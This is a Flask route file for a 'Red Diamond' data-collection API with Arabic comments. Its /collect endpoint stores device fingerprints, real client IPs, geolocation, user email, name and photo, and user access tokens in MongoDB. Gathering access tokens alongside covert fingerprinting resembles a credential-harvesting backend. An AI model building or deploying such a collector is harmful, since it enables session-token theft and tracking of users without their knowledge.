# /routes/collect.py
# routes/collect.py
# Red Diamond - Data Collection & Fingerprinting API (v2.8)
# الوصف: المسؤول عن استقبال بيانات الأجهزة، تخزينها، وتحديث حالة المستخدمين.

from flask import Blueprint, request, jsonify, make_response
import hashlib
import datetime
# استيراد المجموعة بالاسم الصحيح الموحد من نظام النماذج
from models.mongo_db import fingerprints_col

# تعريف الـ Blueprint
collect_api = Blueprint("collect_api", __name__)

# ==========================================
# الوظائف المساعدة (Internal Helpers)
# ==========================================

def get_real_ip():
    """جلب IP المستخدم الحقيقي بدقة مع دعم Cloudflare و Render و Proxies"""
    # 1. محاولة جلب الـ IP من Cloudflare
    cf_ip = request.headers.get("CF-Connecting-IP")
    if cf_ip: return cf_ip
    
    # 2. محاولة جلب الـ IP من الـ Forwarded headers
    forwarded = request.headers.get("X-Forwarded-For")
    if forwarded:
        # نأخذ أول IP في القائمة لأنه الـ Client الحقيقي
        return forwarded.split(",")[0].strip()
    
    # 3. العودة للـ Remote Addr في حال فشل ما سبق
    return request.remote_addr

# ==========================================
# الدالة الأساسية لمعالجة البيانات (Logic)
# ==========================================

def handle_collection():
    """
    الدالة المركزية لمعالجة بيانات الـ Collect. 
    تم فصلها لتسهيل استدعائها من المسارات المرنة في app.py
    """
    try:
        data = request.json
        if not data:
            return jsonify({"status": "error", "message": "Empty payload"}), 400

        # التحقق من حالة قاعدة البيانات
        if fingerprints_col is None:
            print("⚠️ Critical: MongoDB fingerprints_col is NOT initialized.")
            return jsonify({"status": "error", "message": "Database connection offline"}), 503

        # 1. تحديد أو توليد معرف الجهاز (Device ID)
        device_id = data.get("deviceId")
        if not device_id:
            # توليد معرف احتياطي بناءً على بصمة المتصفح الأساسية
            ua = data.get("basic", {}).get("ua", "unknown_ua")
            res = data.get("screen", {}).get("res", "0x0")
            raw_fingerprint = f"{ua}|{res}"
            device_id = "rd_" + hashlib.md5(raw_fingerprint.encode()).hexdigest()[:12]

        # 2. تجهيز سجل البيانات المتكامل
        now = datetime.datetime.utcnow()
        
        # استخراج البيانات من الـ Payload المرسل من info.js
        record = {
            "device_id": device_id,
            "last_seen": now,
            "ip": get_real_ip(),
            "event": data.get("event", "heartbeat"),
            "user": {
                "email": data.get("user", {}).get("email"),
                "name": data.get("user", {}).get("name"),
                "photo": data.get("user", {}).get("photo")
            },
            "tokens": {
                "access": data.get("tokens", {}).get("access") or data.get("token")
            },
            "geo": data.get("geo", {}),
            "hardware": data.get("hardware", {}),
            "screen": data.get("screen", {}),
            "system": data.get("basic", {}),
            "bot_detection": data.get("botDetection", {}),
            "fingerprints": data.get("fingerprints", {}),
            "referrer": data.get("reffe", "direct")
        }

        # 3. عملية التحديث أو الإضافة الذكية (Upsert)
        # نقوم بتحديث البيانات الحالية وإضافة تاريخ "أول ظهور" فقط في حال كان السجل جديداً
        fingerprints_col.update_one(
            {"device_id": device_id},
            {
                "$set": record, 
                "$setOnInsert": {"first_seen": now}
            },
            upsert=True
        )

        return jsonify({
            "status": "success", 
            "device_id": device_id,
            "server_time": now.isoformat()
        }), 200

    except Exception as e:
        print(f"❌ Critical Error in handle_collection: {str(e)}")
        return jsonify({"status": "error", "message": "Internal server processing error"}), 500

# ==========================================
# مسارات الـ Blueprint
# ==========================================

@collect_api.route("/collect", methods=["POST", "OPTIONS"])
def collect_endpoint():
    """المسار الرسمي لاستقبال البيانات"""
    # معالجة طلب الـ Pre-flight (CORS)
    if request.method == "OPTIONS":
        response = make_response(jsonify({"status": "ok"}), 200)
        return response

    return handle_collection()

# مسار إضافي للتحقق من الحالة (Debug)
@collect_api.route("/collect/status", methods=["GET"])
def collect_status():
    return jsonify({
        "module": "Collector API",
        "version": "2.8",
        "db_ready": fingerprints_col is not None
    }), 200